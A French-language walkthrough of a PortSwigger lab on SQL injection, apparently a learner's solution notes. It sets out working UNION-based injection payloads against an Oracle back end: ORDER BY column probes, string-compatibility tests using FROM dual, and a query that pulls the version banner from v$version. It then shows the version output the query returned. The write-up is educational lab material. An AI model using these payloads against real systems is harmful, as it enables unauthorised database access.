## DESCRIPTION
------------------------------------------------------------------------------------------------------

This lab contains an SQL injection vulnerability in the product category filter.
You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

------------------------------------------------------------------------------------------------------

La récupération de la version et du type est somme toute similaire à ce que l'on connait déjà en matière d'énumération de database.
On peut commencer par déterminer le nombre de colonnes et leur compatibilité avec le format string.


Allons dans une catégorie du shop en ligne et lançons une salve de 'ORDER BY ...-- :
```
'ORDER BY 1--
'ORDER BY 2--
```

Internal server error à partir de ORDER BY 3, nous avons donc 2 colonnes.
Si nous voulions passer par UNION SELECT NULL,...-- nous devrions ajouter FROM dual à la fin, car sous Oracle, il faut toujours indiquer
une table vers laquelle nous voulons utiliser SELECT.

Vérifions leur compatibilité :
```
'UNION SELECT 'a',NULL FROM dual--
'UNION SELECT NULL,'a' FROM dual--
```

Les 2 semblent compatibles.

Nous avons donc 2 colonnes compatibles avec le format string, dans une database sous Oracle. C'est le moment de récupérer la version.
Une colonne par défault "banner", appartenant à la table v$version pour les databases sous Oracle
est indiquée dans le SQLi Cheatsheet de Portswigger : https://portswigger.net/web-security/sql-injection/cheat-sheet
On peut donc tenter :
```
'UNION SELECT banner,NULL FROM v$version--
```

Le payload fonctionne, on peut récupérer la version entre les paragraphes sur la page :

CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production